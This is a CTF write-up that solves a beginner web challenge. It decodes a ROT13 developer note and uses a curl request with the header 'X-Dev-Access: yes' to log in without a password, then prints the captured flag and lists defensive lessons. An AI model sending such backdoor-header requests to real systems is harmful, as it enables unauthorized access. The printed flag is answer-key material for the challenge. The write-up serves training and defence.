# 🔐 Crack the Gate 1 — CyLab CTF Write-up

## Overview

**Platform:** CyLab Security Academy
**Challenge:** Crack the Gate 1
**Category:** Web Security / Authentication Bypass
**Difficulty:** Beginner

> This write-up documents an authorized CTF challenge and the techniques used to solve it.

---

## 🎯 Objective

The challenge presented a restricted web portal belonging to a CTF player.

We were given the email address:

```
ctf-player@cylabacademy.org
```

The password was unknown, and normal password guessing was unsuccessful.

The challenge hinted that the developer may have left a hidden way into the application.

---

## 🔎 Initial Enumeration

The target application was hosted at:

```
http://chatelaine.cylabacademy.net:10835/
```

I started by inspecting the application's HTTP response and page source for useful information.

One interesting piece of information was an encoded message:

```
ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf"
```

At first glance, this did not look like normal application text.

---

## 🧩 Decoding the Clue

The text was encoded using **ROT13**.

ROT13 shifts each letter 13 positions through the alphabet.

For example:

```
A → N
B → O
W → J
```

Decoding the message produced:

```
NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"
```

This was the key discovery.

The application appeared to contain a developer authentication bypass using a custom HTTP header.

---

## 🧪 Testing the Bypass

Instead of attempting to guess the password, I tested the discovered header against the login endpoint.

The request was:

```
curl -i -X POST   -H 'X-Dev-Access: yes'   -d 'email=ctf-player@cylabacademy.org'   http://chatelaine.cylabacademy.net:10835/login
```

The server responded with:

```
HTTP/1.1 200 OK
Content-Type: application/json
```

And returned:

```
{
  "success": true,
  "email": "ctf-player@cylabacademy.org",
  "firstName": "pico",
  "lastName": "player",
  "flag": "academy{brut4_f0rc4_cf2e78d0}"
}
```

---

## 🚩 Flag

```
academy{brut4_f0rc4_cf2e78d0}
```

**Challenge solved. ✅**

---

## 🧠 Vulnerability

The core issue was an **authentication bypass through a developer backdoor**.

The application trusted a special HTTP header:

```
X-Dev-Access: yes
```

This provided an alternative authentication path that did not require the user's password.

From a defensive perspective, undocumented development/debug authentication mechanisms should never remain accessible in a production environment.

---

## 🛡️ Defensive Lessons

This challenge highlighted several important web-security concepts:

- Don't leave development authentication mechanisms enabled.
- Don't trust client-controlled HTTP headers for authorization decisions.
- Authentication bypasses can completely undermine strong passwords.
- Debug functionality should be removed or securely disabled before deployment.
- Authentication and authorization should be enforced server-side.
- Security testing should include hidden endpoints, parameters, headers, and alternate authentication paths.

---

## 🧰 Tools Used

- `curl`
- Linux terminal
- HTTP request/response analysis
- ROT13 decoding
- Basic web enumeration

---

## 📚 Key Takeaway

The biggest lesson from this challenge was:

> **Don't immediately brute-force what you don't understand. Investigate the application's behavior first.**

The clue pointed toward an alternative authentication mechanism, and recognizing that clue was more important than guessing passwords.

**Crack the Gate 1 — Solved. 🔐**

---

### Disclaimer

This write-up describes activity performed against an intentionally vulnerable **CTF environment** for educational purposes. The techniques should only be used against systems where you have explicit authorization.